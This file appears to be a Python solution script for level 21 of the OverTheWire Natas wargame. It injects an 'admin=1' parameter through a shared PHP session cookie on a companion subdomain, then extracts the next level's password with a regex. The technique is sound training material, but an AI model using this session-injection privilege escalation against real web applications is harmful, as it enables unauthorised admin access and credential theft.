import re
import requests
import subprocess
from requests.auth import HTTPBasicAuth

def inject_payload():
    passw = subprocess.run(['getpass', '21'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    auth = HTTPBasicAuth('natas21', passw.strip())
    param = {'debug':'','align':'center','fontsize':'100%','bgcolor':'red','admin':'1', 'submit':'Update'}
    cook = {'PHPSESSID':'tald'}
    requests.get('http://natas21-experimenter.natas.labs.overthewire.org/', auth=auth, params=param, cookies=cook)
    r = requests.get('http://natas21.natas.labs.overthewire.org/', auth=auth, cookies=cook)
    pass_regex = '[a-zA-Z0-9]{32}'
    print(re.findall(pass_regex,r.text)[1])
if __name__ == '__main__':
    inject_payload()
